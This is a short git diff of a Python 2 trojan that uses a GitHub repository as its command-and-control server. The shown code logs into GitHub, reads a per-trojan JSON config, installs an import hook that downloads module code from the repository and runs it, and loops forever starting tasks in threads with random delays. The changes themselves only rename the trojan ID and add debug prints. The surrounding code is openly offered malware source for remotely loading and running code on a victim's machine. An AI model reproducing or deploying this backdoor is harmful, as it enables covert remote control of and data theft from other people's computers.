@@ -9,7 +9,7 @@ import Queue
 import os
 from github3 import login
 
-trojan_id="asd"
+trojan_id="trojan"
 trojan_config = "%s.json" %(trojan_id)
 data_path = "data/%s/" %(trojan_id)
 trojan_modules = []
@@ -25,6 +25,7 @@ def connect_github():
 def get_file_contens(filepath):
 	gh,repo,brach = connect_github()
 	tree = brach.commit.commit.tree.recurse()
+
 	for filename in tree.tree:
 		if filepath in filename.path:
 			print "found file %s" %filepath
@@ -54,6 +55,7 @@ class GitImporter(object):
 		self.current_module_code =""
 
 	def find_module(self, fullname,path=None):
+		print "find module"
 		if configured :
 			print "Attempting to retrieve %s" %fullname
 			new_library = get_file_contens("modules/%s/" %fullname)
@@ -78,11 +80,13 @@ def module_runner(module):
 	return
 
 sys.meta_path = [GitImporter()]
+print "blabla"
 
 while True:
 	if task_queue.empty():
 		config = get_trojan_config()
 		for task in config:
+			print "in task"
 			t = threading.Thread(target=module_runner,args=(task['module'],))
 			t.start()
 			time.sleep(random.randint(1000,10000))
